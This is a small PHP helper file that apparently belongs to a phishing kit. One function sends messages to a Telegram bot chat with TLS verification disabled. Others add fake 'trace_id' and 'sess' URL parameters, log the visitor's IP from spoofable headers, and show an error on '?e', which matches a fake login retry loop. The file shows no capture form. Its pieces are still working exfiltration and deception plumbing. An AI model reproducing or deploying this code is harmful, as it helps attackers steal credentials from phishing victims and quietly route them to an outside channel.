<?php 

function call($msg){
    global $token;
    global $id;

    $c = curl_init('https://api.telegram.org/bot'.$token.'/sendMessage?chat_id='.$id.'&text='.urlencode($msg));
    curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
    $res = curl_exec($c); 
    return $res;
}


function mkurl($str = null){
    if($str==null){
        $res = "?";
    }else{
        $res = "&";
    }

    return $res."trace_id=".uniqid()."&sess=".md5(time());
}


function getIp(){
 if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
            $ip = $_SERVER['HTTP_CLIENT_IP'];
        } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            $ipList = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
            $ip = trim($ipList[0]);
        } else {
            $ip = $_SERVER['REMOTE_ADDR'] ?? '127.0.0.1';
        }

        return ($ip === "::1") ? "127.0.0.1" : $ip;
}



function setError($err){
    if(isset($_GET['e'])):
        echo '<div class="error">'.$err.'</div>';
    endif;
}

?>